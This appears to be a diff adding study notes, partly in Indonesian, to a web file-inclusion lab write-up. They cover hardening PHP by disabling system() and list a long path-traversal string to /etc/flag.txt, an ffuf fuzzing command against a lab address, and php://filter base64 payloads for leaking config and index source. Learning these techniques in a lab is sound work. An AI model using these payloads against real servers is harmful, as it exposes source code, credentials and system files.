@@ -138,3 +138,32 @@ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-li
 
 ../../../../../../../../../../../../../../../../../../../../../../etc/flag.txt
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://83.136.255.150:40951/index.php?
+
+##
+find / -name php.ini -type f 2> /dev/null
+
+/etc/php/7.4/apache2/php.ini
+
+sudo nano /etc/php/7.4/apache2/php.ini
+disable_functions = system
+
+sudo systemctl restart apache2
+create sh.php in /var/www/html
+```php
+<?php
+system('ls');
+?>
+```
+
+sudo cat /var/log/apache2/error.log
+PHP Warning:  system() has been disabled for security reasons in /var/www/html/test_system.php on line 2
+
+system() has been disabled for **security** reasons.
+
+##
+php://filter/read=convert.base64-encode/resource=config
+php://filter/read=convert.base64-encode/resource=index
+
+view page source, lalu copy hasil index di dalam webnya yang (panjang itu)
+lalu ubah di burp suite menjadi base64
+
